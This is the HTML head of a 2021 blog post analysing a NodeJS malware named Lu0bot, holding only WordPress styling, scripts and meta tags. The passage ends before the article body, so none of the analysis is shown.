<!doctype html>
<html lang=en class="no-js">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Lu0bot &#8211; An unknown NodeJS malware using UDP &#8211; Fumik0_&#039;s box</title>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//secure.gravatar.com' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//fonts-api.wp.com' />
<link rel='dns-prefetch' href='//widgets.wp.com' />
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//0.gravatar.com' />
<link rel='dns-prefetch' href='//1.gravatar.com' />
<link rel='dns-prefetch' href='//2.gravatar.com' />
<link rel='dns-prefetch' href='//jetpack.wordpress.com' />
<link rel='dns-prefetch' href='//public-api.wordpress.com' />
<link rel='preconnect' href='//i0.wp.com' />
<link rel='preconnect' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Feed" href="https://fumik0.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Comments Feed" href="https://fumik0.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Fumik0_&#039;s box &raquo; Lu0bot &#8211; An unknown NodeJS malware using UDP Comments Feed" href="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/fumik0.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.7.1/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<style id='wp-block-library-inline-css' type='text/css'>
.has-text-align-justify{text-align:justify;}
</style>
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.7.1/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-family--albert-sans: 'Albert Sans', sans-serif;--wp--preset--font-family--alegreya: Alegreya, serif;--wp--preset--font-family--arvo: Arvo, serif;--wp--preset--font-family--bodoni-moda: 'Bodoni Moda', serif;--wp--preset--font-family--bricolage-grotesque: 'Bricolage Grotesque', sans-serif;--wp--preset--font-family--cabin: Cabin, sans-serif;--wp--preset--font-family--chivo: Chivo, sans-serif;--wp--preset--font-family--commissioner: Commissioner, sans-serif;--wp--preset--font-family--cormorant: Cormorant, serif;--wp--preset--font-family--courier-prime: 'Courier Prime', monospace;--wp--preset--font-family--crimson-pro: 'Crimson Pro', serif;--wp--preset--font-family--dm-mono: 'DM Mono', monospace;--wp--preset--font-family--dm-sans: 'DM Sans', sans-serif;--wp--preset--font-family--dm-serif-display: 'DM Serif Display', serif;--wp--preset--font-family--domine: Domine, serif;--wp--preset--font-family--eb-garamond: 'EB Garamond', serif;--wp--preset--font-family--epilogue: Epilogue, sans-serif;--wp--preset--font-family--fahkwang: Fahkwang, sans-serif;--wp--preset--font-family--figtree: Figtree, sans-serif;--wp--preset--font-family--fira-sans: 'Fira Sans', sans-serif;--wp--preset--font-family--fjalla-one: 'Fjalla One', sans-serif;--wp--preset--font-family--fraunces: Fraunces, serif;--wp--preset--font-family--gabarito: Gabarito, system-ui;--wp--preset--font-family--ibm-plex-mono: 'IBM Plex Mono', monospace;--wp--preset--font-family--ibm-plex-sans: 'IBM Plex Sans', sans-serif;--wp--preset--font-family--ibarra-real-nova: 'Ibarra Real Nova', serif;--wp--preset--font-family--instrument-serif: 'Instrument Serif', serif;--wp--preset--font-family--inter: Inter, sans-serif;--wp--preset--font-family--josefin-sans: 'Josefin Sans', sans-serif;--wp--preset--font-family--jost: Jost, sans-serif;--wp--preset--font-family--libre-baskerville: 'Libre Baskerville', serif;--wp--preset--font-family--libre-franklin: 'Libre Franklin', sans-serif;--wp--preset--font-family--literata: Literata, serif;--wp--preset--font-family--lora: Lora, serif;--wp--preset--font-family--merriweather: Merriweather, serif;--wp--preset--font-family--montserrat: Montserrat, sans-serif;--wp--preset--font-family--newsreader: Newsreader, serif;--wp--preset--font-family--noto-sans-mono: 'Noto Sans Mono', sans-serif;--wp--preset--font-family--nunito: Nunito, sans-serif;--wp--preset--font-family--open-sans: 'Open Sans', sans-serif;--wp--preset--font-family--overpass: Overpass, sans-serif;--wp--preset--font-family--pt-serif: 'PT Serif', serif;--wp--preset--font-family--petrona: Petrona, serif;--wp--preset--font-family--piazzolla: Piazzolla, serif;--wp--preset--font-family--playfair-display: 'Playfair Display', serif;--wp--preset--font-family--plus-jakarta-sans: 'Plus Jakarta Sans', sans-serif;--wp--preset--font-family--poppins: Poppins, sans-serif;--wp--preset--font-family--raleway: Raleway, sans-serif;--wp--preset--font-family--roboto: Roboto, sans-serif;--wp--preset--font-family--roboto-slab: 'Roboto Slab', serif;--wp--preset--font-family--rubik: Rubik, sans-serif;--wp--preset--font-family--rufina: Rufina, serif;--wp--preset--font-family--sora: Sora, sans-serif;--wp--preset--font-family--source-sans-3: 'Source Sans 3', sans-serif;--wp--preset--font-family--source-serif-4: 'Source Serif 4', serif;--wp--preset--font-family--space-mono: 'Space Mono', monospace;--wp--preset--font-family--syne: Syne, sans-serif;--wp--preset--font-family--texturina: Texturina, serif;--wp--preset--font-family--urbanist: Urbanist, sans-serif;--wp--preset--font-family--work-sans: 'Work Sans', sans-serif;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-albert-sans-font-family{font-family: var(--wp--preset--font-family--albert-sans) !important;}.has-alegreya-font-family{font-family: var(--wp--preset--font-family--alegreya) !important;}.has-arvo-font-family{font-family: var(--wp--preset--font-family--arvo) !important;}.has-bodoni-moda-font-family{font-family: var(--wp--preset--font-family--bodoni-moda) !important;}.has-bricolage-grotesque-font-family{font-family: var(--wp--preset--font-family--bricolage-grotesque) !important;}.has-cabin-font-family{font-family: var(--wp--preset--font-family--cabin) !important;}.has-chivo-font-family{font-family: var(--wp--preset--font-family--chivo) !important;}.has-commissioner-font-family{font-family: var(--wp--preset--font-family--commissioner) !important;}.has-cormorant-font-family{font-family: var(--wp--preset--font-family--cormorant) !important;}.has-courier-prime-font-family{font-family: var(--wp--preset--font-family--courier-prime) !important;}.has-crimson-pro-font-family{font-family: var(--wp--preset--font-family--crimson-pro) !important;}.has-dm-mono-font-family{font-family: var(--wp--preset--font-family--dm-mono) !important;}.has-dm-sans-font-family{font-family: var(--wp--preset--font-family--dm-sans) !important;}.has-dm-serif-display-font-family{font-family: var(--wp--preset--font-family--dm-serif-display) !important;}.has-domine-font-family{font-family: var(--wp--preset--font-family--domine) !important;}.has-eb-garamond-font-family{font-family: var(--wp--preset--font-family--eb-garamond) !important;}.has-epilogue-font-family{font-family: var(--wp--preset--font-family--epilogue) !important;}.has-fahkwang-font-family{font-family: var(--wp--preset--font-family--fahkwang) !important;}.has-figtree-font-family{font-family: var(--wp--preset--font-family--figtree) !important;}.has-fira-sans-font-family{font-family: var(--wp--preset--font-family--fira-sans) !important;}.has-fjalla-one-font-family{font-family: var(--wp--preset--font-family--fjalla-one) !important;}.has-fraunces-font-family{font-family: var(--wp--preset--font-family--fraunces) !important;}.has-gabarito-font-family{font-family: var(--wp--preset--font-family--gabarito) !important;}.has-ibm-plex-mono-font-family{font-family: var(--wp--preset--font-family--ibm-plex-mono) !important;}.has-ibm-plex-sans-font-family{font-family: var(--wp--preset--font-family--ibm-plex-sans) !important;}.has-ibarra-real-nova-font-family{font-family: var(--wp--preset--font-family--ibarra-real-nova) !important;}.has-instrument-serif-font-family{font-family: var(--wp--preset--font-family--instrument-serif) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-josefin-sans-font-family{font-family: var(--wp--preset--font-family--josefin-sans) !important;}.has-jost-font-family{font-family: var(--wp--preset--font-family--jost) !important;}.has-libre-baskerville-font-family{font-family: var(--wp--preset--font-family--libre-baskerville) !important;}.has-libre-franklin-font-family{font-family: var(--wp--preset--font-family--libre-franklin) !important;}.has-literata-font-family{font-family: var(--wp--preset--font-family--literata) !important;}.has-lora-font-family{font-family: var(--wp--preset--font-family--lora) !important;}.has-merriweather-font-family{font-family: var(--wp--preset--font-family--merriweather) !important;}.has-montserrat-font-family{font-family: var(--wp--preset--font-family--montserrat) !important;}.has-newsreader-font-family{font-family: var(--wp--preset--font-family--newsreader) !important;}.has-noto-sans-mono-font-family{font-family: var(--wp--preset--font-family--noto-sans-mono) !important;}.has-nunito-font-family{font-family: var(--wp--preset--font-family--nunito) !important;}.has-open-sans-font-family{font-family: var(--wp--preset--font-family--open-sans) !important;}.has-overpass-font-family{font-family: var(--wp--preset--font-family--overpass) !important;}.has-pt-serif-font-family{font-family: var(--wp--preset--font-family--pt-serif) !important;}.has-petrona-font-family{font-family: var(--wp--preset--font-family--petrona) !important;}.has-piazzolla-font-family{font-family: var(--wp--preset--font-family--piazzolla) !important;}.has-playfair-display-font-family{font-family: var(--wp--preset--font-family--playfair-display) !important;}.has-plus-jakarta-sans-font-family{font-family: var(--wp--preset--font-family--plus-jakarta-sans) !important;}.has-poppins-font-family{font-family: var(--wp--preset--font-family--poppins) !important;}.has-raleway-font-family{font-family: var(--wp--preset--font-family--raleway) !important;}.has-roboto-font-family{font-family: var(--wp--preset--font-family--roboto) !important;}.has-roboto-slab-font-family{font-family: var(--wp--preset--font-family--roboto-slab) !important;}.has-rubik-font-family{font-family: var(--wp--preset--font-family--rubik) !important;}.has-rufina-font-family{font-family: var(--wp--preset--font-family--rufina) !important;}.has-sora-font-family{font-family: var(--wp--preset--font-family--sora) !important;}.has-source-sans-3-font-family{font-family: var(--wp--preset--font-family--source-sans-3) !important;}.has-source-serif-4-font-family{font-family: var(--wp--preset--font-family--source-serif-4) !important;}.has-space-mono-font-family{font-family: var(--wp--preset--font-family--space-mono) !important;}.has-syne-font-family{font-family: var(--wp--preset--font-family--syne) !important;}.has-texturina-font-family{font-family: var(--wp--preset--font-family--texturina) !important;}.has-urbanist-font-family{font-family: var(--wp--preset--font-family--urbanist) !important;}.has-work-sans-font-family{font-family: var(--wp--preset--font-family--work-sans) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='bootstrap-css' href='https://fumik0.com/wp-content/themes/mynote/assets/css/bootstrap.min.css?ver=4.1.0' type='text/css' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://fumik0.com/wp-content/themes/mynote/assets/css/fontawesome-all.min.css?ver=5.1.0' type='text/css' media='all' />
<link rel='stylesheet' id='mynote-font-roboto-css' href='https://fonts-api.wp.com/css?family=Roboto%3A300%2C400&#038;ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='mynote-css' href='https://fumik0.com/wp-content/themes/mynote/style.css?ver=1.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_likes-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/likes/style.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='subscription-modal-css-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/comments/subscription-modal-on-comment/subscription-modal.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='tablepress-default-css' href='https://fumik0.com/wp-content/plugins/tablepress/css/build/default.css?ver=2.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='hcb-style-css' href='https://fumik0.com/wp-content/plugins/highlighting-code-block/build/css/hcb_style.css?ver=1.2.9' type='text/css' media='all' />
<style id='hcb-style-inline-css' type='text/css'>
.hcb_wrap pre.prism{font-size: 15px}@media screen and (max-width: 599px){.hcb_wrap pre.prism{font-size: 15px}}.hcb_wrap pre:not([data-file]):not([data-show-lang])::before{ content: none;}.hcb_wrap pre{-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;}.hcb_wrap pre{font-family:Menlo, Consolas, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;}
</style>
<link rel='stylesheet' id='hcb-coloring-css' href='https://fumik0.com/wp-content/plugins/highlighting-code-block/build/css/coloring_dark.css?ver=1.2.9' type='text/css' media='all' />
<style id='jetpack-global-styles-frontend-style-inline-css' type='text/css'>
:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
</style>
<link rel='stylesheet' id='sharedaddy-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/sharedaddy/sharing.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://fumik0.com/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=14.2-a.3' type='text/css' media='all' />
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/themes/mynote/assets/js/bootstrap.bundle.min.js?ver=4.1.0" id="bootstrap-js"></script>
<script type="text/javascript" id="jetpack-mu-wpcom-settings-js-before">
/* <![CDATA[ */
var JETPACK_MU_WPCOM_SETTINGS = {"assetsUrl":"https:\/\/fumik0.com\/wp-content\/mu-plugins\/wpcomsh\/vendor\/automattic\/jetpack-mu-wpcom\/src\/build\/"};
/* ]]> */
</script>
<link rel="https://api.w.org/" href="https://fumik0.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://fumik0.com/wp-json/wp/v2/posts/3431" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://fumik0.com/xmlrpc.php?rsd" />

<link rel="canonical" href="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/" />
<link rel='shortlink' href='https://wp.me/p9vZjq-Tl' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://fumik0.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffumik0.com%2F2021%2F06%2F24%2Flu0bot-an-unknown-nodejs-malware-using-udp%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://fumik0.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffumik0.com%2F2021%2F06%2F24%2Flu0bot-an-unknown-nodejs-malware-using-udp%2F&#038;format=xml" />
	<style>img#wpstats{display:none}</style>
		<style id="mynote-customizer">
@media (max-width: 768px) {
.footer-columns { text-align: center !important; }
.footer-columns .footer-column-left { text-align: center !important; }
}
.scroll-area { display: block !important; }
body.menu-is-collapsed .header { background: rgba(20, 25, 29, 1) !important; }

</style><meta name="description" content="In February/March 2021, A curious lightweight payload has been observed from a well-known load seller platform. At the opposite of classic info-stealers being pushed at an industrial level, this one is widely different in the current landscape/trends. Feeling being in front of a grey box is somewhat a stressful problem, where you have no idea&hellip;" />
<link rel="amphtml" href="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Lu0bot &#8211; An unknown NodeJS malware using UDP" />
<meta property="og:url" content="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/" />
<meta property="og:description" content="In February/March 2021, A curious lightweight payload has been observed from a well-known load seller platform. At the opposite of classic info-stealers being pushed at an industrial level, this on…" />
<meta property="article:published_time" content="2021-06-24T08:37:41+00:00" />
<meta property="article:modified_time" content="2021-06-24T08:37:41+00:00" />
<meta property="og:site_name" content="Fumik0_&#039;s box" />
<meta property="og:image" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?resize=1200%2C853&#038;ssl=1" />
<meta property="og:image:width" content="1200" />
